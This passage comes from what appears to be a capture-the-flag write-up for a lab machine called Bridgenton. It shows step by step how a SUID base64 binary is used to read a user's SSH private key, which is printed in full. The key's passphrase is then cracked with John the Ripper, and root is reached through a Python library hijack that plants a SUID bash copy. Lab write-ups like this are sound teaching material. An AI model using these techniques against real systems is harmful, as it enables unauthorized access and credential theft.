</span></span></span></code></pre></div><ul><li>Based on the last line, I will try to read some privileged files that only <code>root</code> could read like <code>/etc/shadow</code>. For this we can run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ /usr/bin/base64 /etc/shadow | base64 --decode
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/usr/bin/base64: /etc/shadow: Permission denied
</span></span></span></code></pre></div><p>We got permission denied. But why?</p><ul><li>If we check more details about <code>/usr/bin/base64</code> binary we have the reason:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ ls -la /usr/bin/base64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwsr-xr-x 1 james james 48016 Sep 20  2022 /usr/bin/base64
</span></span></span></code></pre></div><p>the user <code>james</code> is the owner of this binary and, therefore, we can only abuse <code>SUID</code> rights for this user, <em>not</em> for <code>root</code> user.</p><ul><li>Since we can read files as <code>james</code> user, and given the fact that <code>SSH</code> service was active, we can try to read <code>SSH</code> keys. For this we could try to read <code>/home/james/.ssh/id_rsa</code> that is the file where usually a <code>SSH</code> is stored at. I check if user <code>james</code> has a directory at <code>/home</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ ls -la /home
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 12
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  3 root  root  4096 Mar 29 00:56 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root  root  4096 Mar 29 00:54 ..
</span></span></span><span class=line><span class=cl><span class=go>drwx------  4 james james 4096 Sep  3 02:56 james
</span></span></span></code></pre></div><p>and he does, so a key might exist.</p><ul><li>Based on this we run:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>www-data@Bridgenton:/var/www/html$ /usr/bin/base64 /home/james/.ssh/id_rsa | base64 --decode
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span></span><span class=line><span class=cl><span class=go>b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABALGSD+7G
</span></span></span><span class=line><span class=cl><span class=go>VAgvhq1BAfYGyxAAAAEAAAAAEAAAGXAAAAB3NzaC1yc2EAAAADAQABAAABgQC0iftAUEoD
</span></span></span><span class=line><span class=cl><span class=go>QuKzq2LP3oMC+WZJdnKEhwEb23pMUboabNinhJqT5s4yh/9U/Icazmk4ucBuaEWaX+dPnG
</span></span></span><span class=line><span class=cl><span class=go>sB6VYIccQHlJPgXWqSuTNcLHOT+N8ImnN9MTNmZnbnXbtpIWVp7UIw1Efm7aDpmj/wccDb
</span></span></span><span class=line><span class=cl><span class=go>QeHwE/5yDO3mTisbWYlfax2yoMAvMjyUlzfYC1q+L8vqdC3OSc0wEku6oIxQYzAUun5Th0
</span></span></span><span class=line><span class=cl><span class=go>RPiYeiBvjLjQRTbtzSv8lF5tgoPYDGA4uZktvat7zQwqXlqQhnTt6HddDm5t57XbAYXGk4
</span></span></span><span class=line><span class=cl><span class=go>dAp7D1K9EVgaVQIdruZu8HfeDTkiTxRMiLjA9nHYwZiQZp8+WjBL3geZBwOnPSRK2WTfQ3
</span></span></span><span class=line><span class=cl><span class=go>LvO0YAwGSx9QjLZ1hQibIUdZi7FZJIT6YeO4A5ueD6UMfA2E5Bd4kT0AxgJ2vvLCbR+SLQ
</span></span></span><span class=line><span class=cl><span class=go>VaTLNVWucPiPNaoELf8RA4W6ZidOznVw4vD1Wc4azFZYOQaXCbs1kkvSuMC7pW2NEabgYn
</span></span></span><span class=line><span class=cl><span class=go>YuayfbXfH5ckUAAAWQObGz/oYWZscSkz4i2zfbkNCoy7nygRZsWoZHToZQEPNwonO3ICRc
</span></span></span><span class=line><span class=cl><span class=go>mqCeMniaBpSpsZEwz8quj85ZT9wxaM962odvV2jh2vhF47PAFJijH+Tufse9XqHMb0+Zvo
</span></span></span><span class=line><span class=cl><span class=go>vHHpWKPB23Ysr5Tym0dFWlBYXBXGP2fREV2f8zdU+k1e/hOhMz2yXBahmNLEHrwjBJY0Fz
</span></span></span><span class=line><span class=cl><span class=go>fAi4fnbvfjyXnQPYOOS45cmctnodW1IHWpgnU/FI+BWEyu8m+D/StppaTPxOqXrJetMNox
</span></span></span><span class=line><span class=cl><span class=go>QiGVy2T/uBhg9SKnYqp+misOkqKrfJwGQ9pW+dMse88xBbl7SeIx4NNdKj8iZsw+QMZasn
</span></span></span><span class=line><span class=cl><span class=go>FbBzYLFeCncoTuONBNFitBMl28oNoFWAxCvM7zGoD85YVWhrGfQQunpWg44krK2HYlumqp
</span></span></span><span class=line><span class=cl><span class=go>vcx1q6RWjuaQzKSdQ9pMeQaqqu7kOg8B0d6PmDq57t0tMjBCxAFyrmNZjJV44puGKQe4Pk
</span></span></span><span class=line><span class=cl><span class=go>sXVKWLiUOHomfwCg4VEmYAZixYm9hlaK7uWnN3QpaHbUqo55ex3o0FTumLpjv3xnP6B14M
</span></span></span><span class=line><span class=cl><span class=go>Wjaq5SAlMvCulA4k0z6sv3huvCmq+Ds4FBzllgf26bO97a8pcLdBfugbgUFoHBRfZd2kiD
</span></span></span><span class=line><span class=cl><span class=go>lth1m6b2BKWuyzXOw9+OjtCWxsxeTG4zNcyXuym7WvTALJfVOa2ajhL151JPcNXd+qEnug
</span></span></span><span class=line><span class=cl><span class=go>KacFcWEEU7GY6q+IStYkPFX2SeiOq+yo376VdY0ALxxLiUy0Fp0MWCSDSF+sHz7TafKZ9Y
</span></span></span><span class=line><span class=cl><span class=go>LlGb/w5E+9+Y5ui8IHMj+pIhY4MHe43NkuRsfEYrkbPvoVNhG73CYaWLgmzoP2Zf6IF8J+
</span></span></span><span class=line><span class=cl><span class=go>WoeHZQaKzQWgltyTXbKFf0bhS/elsZrDf06ZpFTWLvyhb1yVFT/46D/NIfbPxk90mDTOaE
</span></span></span><span class=line><span class=cl><span class=go>LIASrRJQNmMpgw7VLexgA5hQ5LEFYLDHIY1QYm2Ow9l75eBDVmuCgArSvKclS9LxMSFv+v
</span></span></span><span class=line><span class=cl><span class=go>C6+hdQtapBvkxtZbEHZMhkpoJxyDHJlybEwnxVn8/Cz1Z70KY0NLRxUlKD6YQR6b9em1JF
</span></span></span><span class=line><span class=cl><span class=go>9odM3GohlAbxM9TSP6MKB3tfFNswBTq2C9YIOJUX2K4wWEbkRxFHdtw55ICpe2OR8CRiFa
</span></span></span><span class=line><span class=cl><span class=go>JGv06r6y3WaCGM7gDFl7gJhMa+kOyBsuBmupUvaTD6XYCHQnvb12lsiN0/MeCfTp0z48CR
</span></span></span><span class=line><span class=cl><span class=go>eEM76nTzNqXDFYjKxaN4stFJGer6uLo9oTm1i/iODYnlvVYHRFXU0xTYC/8cMwOFXzouLV
</span></span></span><span class=line><span class=cl><span class=go>5bx2qBdwthCDSEetlqYZg/vNBa7Q11FnbftAceVTODtJmPFyOfvD9+W/OnP8jS+yx4oATX
</span></span></span><span class=line><span class=cl><span class=go>F3pCzgd+2b1R3F1y5Kp3/w3Z700+e+j4Cg82DaYxW5626FeW5cm5bYlrbKTVTISzC/zlH/
</span></span></span><span class=line><span class=cl><span class=go>CuDzimLDgz/nC4N5b4rVb1gZutlPrSVkVFVr9hNOQ5FdMje9TSMIbOPgLhAxNggTbmy7L1
</span></span></span><span class=line><span class=cl><span class=go>WLrLm2pLpO97ZE0SQS250AfL2G0Tqtgycf0pEmKq/tvtIMORAsxuQJVFBV5AcZYwhO2lmO
</span></span></span><span class=line><span class=cl><span class=go>2YK2FKt4c0AS9Bp1pSBWVxF2ae9R1vy1Z3boBnIluBMkh/PHoGa6lk/WQne4HUs8yXBwnQ
</span></span></span><span class=line><span class=cl><span class=go>8ejNS2Oj7y9nUP/1TP2q2rZOSGgpYIkQcpgGFYwSyzVeuR7/MbnbwSjlcvDHtysj5qjjJL
</span></span></span><span class=line><span class=cl><span class=go>QSRZK8wnZcX4jLONWyRm3eC2OPQB/LTP4L3FxPykZ7cSB3QYCQV7a0FT7gOxDO9TRTLo9Y
</span></span></span><span class=line><span class=cl><span class=go>uV9oEfKUt5mVq3e6F+IzEeYK18kKR6Ufg2yOO1q9xExVMmoebcdWmGO9F7mWx/OIPo6Otj
</span></span></span><span class=line><span class=cl><span class=go>lWvshXgJO3XB4OG71RGOASKH+SSMLYHDqiEiGzlEhgcKjU6vFcxEN807mog1+NiGmXOGwm
</span></span></span><span class=line><span class=cl><span class=go>miPO9cjj/N5uge70CWOIqG2YbP4=
</span></span></span><span class=line><span class=cl><span class=go>-----END OPENSSH PRIVATE KEY-----
</span></span></span></code></pre></div><ul><li>We have a key. I copy its content and save it into a file called <code>james_id_rsa</code> using <code>Vim</code> (or you can use your preferred text editor) and assign to the key the rights <code>600</code> with <code>chmod</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ vim james_id_rsa
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ chmod 600 james_id_rsa
</span></span></span></code></pre></div><ul><li>Now, try to log in via <code>SSH</code> as <code>james</code> user using this key:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i james_id_rsa james@10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@10.20.1.125&#39;s password:
</span></span></span></code></pre></div><p>But it still asks for a password. Why? Based on <a href=https://stackoverflow.com/questions/4411457/how-do-i-verify-check-test-validate-my-ssh-passphrase class=external-link target=_blank rel=noopener>this StackOverflow post</a> the key might have a passphrase. To extract it we can use <code>ssh2john</code> to pass it to a crackeable format by <code>JohnTheRipper</code> and attempt to crack its passphrase using a dictionary like the famous <code>rockyou.txt</code>. So, first, hash of the passphrase to a crackeable format:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh2john james_id_rsa &gt; james_hash_ssh
</span></span></span></code></pre></div><p>where we have saved the hash into a file called <code>james_hash_ssh</code>.</p><ul><li>Then, attempt to crack it using <code>JohnTheRipper|john</code> and <code>rockyou.txt</code> dictionary:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ john --wordlist=/usr/share/wordlists/rockyou.txt james_hash_ssh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Cost 2 (iteration count) is 16 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>bowwow           (james_id_rsa)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:07 DONE (2024-09-03 20:11) 0.1328g/s 42.49p/s 42.49c/s 42.49C/s 50cent..101010
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>and we have a password/passphrase: <code>bowwow</code>.</p><ul><li>If we try to log in via <code>SSH</code> with the key and provide the passphrase <code>bowwow</code> now it works:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ssh -i james_id_rsa james@10.20.1.125
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@10.20.1.125&#39;s password:
</span></span></span><span class=line><span class=cl><span class=go>Linux Bridgenton 6.1.0-18-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.76-1 (2024-02-01) x86_64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Debian GNU/Linux system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span></span><span class=line><span class=cl><span class=go>permitted by applicable law.
</span></span></span><span class=line><span class=cl><span class=go>Last login: Tue Sep  3 03:49:28 2024 from 10.20.1.110
</span></span></span><span class=line><span class=cl><span class=go>james@Bridgenton:~$
</span></span></span></code></pre></div><p>and we can get the user flag at this user desktop.</p><hr><h2 id=root>Root
<a class=heading-link href=#root><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><ul><li>Checking what can this user run with <code>sudo</code> we can see he can run a <code>Python</code> script:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for james on Bridgenton:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User james may run the following commands on Bridgenton:
</span></span></span><span class=line><span class=cl><span class=go>    (root) NOPASSWD: /usr/bin/python3 /opt/example.py
</span></span></span></code></pre></div><ul><li>Checking the contents of <code>/opt/example.py</code> shows a really simple script:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=n>cadena</span> <span class=o>=</span> <span class=s2>&#34;Hola esta es mi cadena&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>cadena</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>())</span>
</span></span></code></pre></div><p>This script hashes the content of a string. That&rsquo;s all. If we execute it, we confirm it:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ sudo /usr/bin/python3 /opt/example.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>81f4463d7bee15a7aa32e49e4d77fef9
</span></span></span></code></pre></div><ul><li>I note that this file is located at <code>/opt</code>, if we check the rights in that directory:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ ls -ld /opt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>drwxr-xr-x 3 james root 4096 sep  4 02:21 /opt
</span></span></span></code></pre></div><p>We see that <code>root</code> and <code>james</code> can write in this directory.</p><ul><li>However, trying to replace <code>/opt/example.py</code> by a malicious script is not an option, since <code>/opt/example.py</code> only can be written by <code>root</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ ls -la /opt/example.py
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rw-r--r-- 1 root root 132 abr  1 11:42 /opt/example.py
</span></span></span></code></pre></div><ul><li>We can attempt a <code>Library Hijacking</code>, but first we need to check what is the <code>PATH</code> set for <code>Python</code>. We can check it running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ python3 -c &#39;import sys; print(sys.path)&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[&#39;&#39;, &#39;/usr/lib/python311.zip&#39;, &#39;/usr/lib/python3.11&#39;, &#39;/usr/lib/python3.11/lib-dynload&#39;, &#39;/usr/local/lib/python3.11/dist-packages&#39;, &#39;/usr/lib/python3/dist-packages&#39;]
</span></span></span></code></pre></div><p>where the first element <code>''</code> means that we are executing the actual path. Since the script is located at <code>/opt</code>, this means that the script will first search for libraries at <code>/opt</code>, and then will start searching for libraries at <code>/usr/lib/python311.zip</code>, then <code>/usr/lib/python3.11</code> and so on&mldr;</p><ul><li>So we go to <code>/opt</code> directory and write a malicious file there. Since <code>/opt/example.py</code> is calling <code>hashlib</code> library, that means that we have to name our file <code>hashlib.py</code>. Therefore, we will create a malicious library with the content:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>os</span><span class=o>.</span><span class=n>system</span><span class=p>(</span><span class=s2>&#34;cp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>What this simple script does is that it creates a copy of <code>bash</code> binary and, to that copy, assigns to it <code>SUID</code> rights. Since the owner should be <code>root</code>, we will assign to it owner permissions by <code>root</code>.</p><ul><li>We can do all the steps described from above from the terminal just running:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:~$ cd /opt # move to /opt directory
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@Bridgenton:/opt$ echo -e &#39;#!/usr/bin/python3\n\nimport os\n\nos.system(&#34;cp $(which bash) /tmp/gunzf0x; chmod 4755 /tmp/gunzf0x&#34;)&#39; &gt; /opt/hashlib.py # create the malicious file
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>james@Bridgenton:/opt$ sudo /usr/bin/python3 /opt/example.py # execute the command with &#39;sudo&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=go>  File &#34;/opt/example.py&#34;, line 9, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=go>    print(hashlib.md5(cadena.encode()).hexdigest())
</span></span></span><span class=line><span class=cl><span class=go>          ^^^^^^^^^^^
</span></span></span><span class=line><span class=cl><span class=go>AttributeError: module &#39;hashlib&#39; has no attribute &#39;md5&#39;
</span></span></span></code></pre></div><p>The program returned an error. That is a good sign.</p><ul><li>If we check <code>/tmp</code> directory, our malicious file is there:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:/opt$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1268
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  8 root root    4096 sep  4 02:33 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 18 root root    4096 mar 29 00:54 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root root 1265648 sep  4 02:33 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwx------  3 root root    4096 sep  4 00:34 systemd-private-3cec9ecbbadd474da98f9c3ee0706548-apache2.service-za8GyY
</span></span></span><span class=line><span class=cl><span class=go>drwx------  3 root root    4096 sep  4 00:34 systemd-private-3cec9ecbbadd474da98f9c3ee0706548-systemd-logind.service-D5OsPp
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root root    4096 sep  4 00:34 .XIM-unix
</span></span></span></code></pre></div><p>where <code>-rwsr-xr-x 1 root root</code> indicates it has <code>SUID</code> permissions and the owner is <code>root</code> as we planned.</p><ul><li>Therefore, we can run it with the owner -that was <code>root</code>- permissions with <code>-p</code> flag and become <code>root</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>james@Bridgenton:/opt$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.2# whoami
</span></span></span><span class=line><span class=cl><span class=go>root
</span></span></span></code></pre></div><p>We can finally read the <code>root</code> user flag at <code>/root</code> directory</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>